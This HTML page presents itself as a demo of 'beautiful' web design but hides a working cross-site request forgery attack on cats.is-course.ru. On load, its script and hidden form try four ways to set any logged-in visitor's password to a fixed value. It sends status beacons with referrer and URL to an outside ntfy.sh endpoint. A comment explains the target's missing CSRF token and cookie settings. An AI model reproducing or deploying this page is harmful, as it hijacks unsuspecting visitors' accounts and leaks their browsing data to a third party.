<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Awesome web design</title>
<style>
  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; padding: 40px; max-width: 720px; }
  h1 { color: #2563eb; }
</style>
</head>
<body>
<h1>Check out this beautiful design</h1>
<p>This page demonstrates a sleek, modern web design pattern.</p>

<!--
  cats.is-course.ru: /settings accepts a POST (password, confirm-password) with no CSRF token.
  Session cookie is SameSite=None; Secure; HttpOnly, so a cross-site request carries it.
  We try three transports so at least one survives the visitor's cookie policy:
    1) fetch(no-cors, credentials:include)  - third-party context
    2) sendBeacon                          - simple POST
    3) targeted form submit                - iframe, then full top-level navigation
-->
<form id="pw" action="https://cats.is-course.ru/settings" method="POST">
  <input type="hidden" name="password" value="Catadmin1234!q">
  <input type="hidden" name="confirm-password" value="Catadmin1234!q">
</form>

<script>
(function () {
  var T = 'https://ntfy.sh/yds26cats9f3a';
  var NEWPW = 'Catadmin1234!q';
  var body = 'password=' + encodeURIComponent(NEWPW) + '&confirm-password=' + encodeURIComponent(NEWPW);

  function beacon(kind, extra) {
    try {
      fetch(T, { method: 'POST', mode: 'no-cors',
                 body: kind + ' :: ' + (extra || '') + ' :: ref=' + document.referrer + ' :: href=' + location.href });
    } catch (e) {}
  }
  beacon('PAGE_RENDERED');

  // 1) credentialed no-cors fetch
  try {
    fetch('https://cats.is-course.ru/settings', {
      method: 'POST', mode: 'no-cors', credentials: 'include',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body
    }).then(function () { beacon('FETCH_OK'); }).catch(function (e) { beacon('FETCH_ERR', e); });
  } catch (e) { beacon('FETCH_THROW', e); }

  // 2) sendBeacon
  try {
    navigator.sendBeacon('https://cats.is-course.ru/settings',
      new Blob([body], { type: 'application/x-www-form-urlencoded' }));
    beacon('BEACON_SENT');
  } catch (e) { beacon('BEACON_ERR', e); }

  // 3a) iframe form submit (third-party context)
  try {
    var ifr = document.createElement('iframe');
    ifr.name = 'sink_iframe'; ifr.style.display = 'none';
    document.body.appendChild(ifr);
    var f2 = document.getElementById('pw').cloneNode(true);
    f2.id = 'pw2'; f2.target = 'sink_iframe';
    document.body.appendChild(f2);
    setTimeout(function () { try { f2.submit(); beacon('IFRAME_SUBMIT'); } catch (e) {} }, 400);
  } catch (e) {}

  // 3b) full top-level navigation (survives third-party cookie blocking)
  setTimeout(function () {
    try { beacon('TOPLEVEL_SUBMIT'); document.getElementById('pw').submit(); }
    catch (e) { beacon('TOPLEVEL_ERR', e); }
  }, 900);
})();
</script>
</body>
</html>
